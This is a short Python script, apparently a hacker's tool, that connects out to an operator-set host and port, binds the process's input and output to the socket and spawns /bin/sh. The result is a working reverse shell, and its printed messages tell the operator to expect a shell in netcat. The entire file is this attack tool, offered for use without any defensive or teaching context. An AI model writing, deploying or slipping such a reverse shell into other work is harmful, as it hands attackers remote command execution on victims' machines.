#!/usr/bin/env python
# Hacked together by ioNoSpHeRe
# Are we positively charged?
import socket,pty,os;
host = "127.0.0.1" # CHANGE THIS!!!
port = 1337 # CHANGE THIS!

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
print ("Are we positively charged? - w0rkz\n\n");
print ("you should see a shell in netcat now... :D\n\n");
s.connect((host, port))
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=pty.spawn("/bin/sh")
